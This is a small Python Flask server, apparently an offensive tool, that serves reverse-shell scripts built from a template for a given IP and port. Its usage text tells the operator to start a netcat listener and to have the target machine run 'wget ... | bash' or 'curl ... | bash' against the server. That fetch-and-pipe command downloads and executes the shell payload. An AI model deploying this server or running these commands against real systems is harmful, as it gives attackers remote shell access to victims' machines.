from flask import Flask, make_response, Response
from string import Template
from pathlib import Path
import os

app = Flask(__name__)

usage = """# 1. On your machine:
#
#	rlwrap nc -l 1337
#
# 2. On the target machine:
#
#	wget -qO- http://mi-ip-host:port/127.0.0.1:1337 | bash
# 
#	curl http://mi-ip-host:port/127.0.0.1:1337 | bash
#
"""

def shells(ip:str, port:str) -> str:
    file = Path( os.path.dirname(os.path.realpath(__file__)) + '/shells.template' ).read_text()
    template = Template(file)
    template = template.safe_substitute(host=ip, port=port)

    return template

@app.route('/', defaults={'ip': '','port':''})
@app.route("/<ip>:<port>", methods = ['GET'])
def main(ip:str, port:str) -> Response:

    if not ip or not port:
        response = make_response(usage)
        response.content_type = "text/plain"

        return response        

    response = make_response(shells(ip, port))
    response.content_type = "text/plain"
    print(f'Shell for: {ip}:{port}')

    return response


if __name__ == "__main__":
    app.run(port=8000,host='0.0.0.0')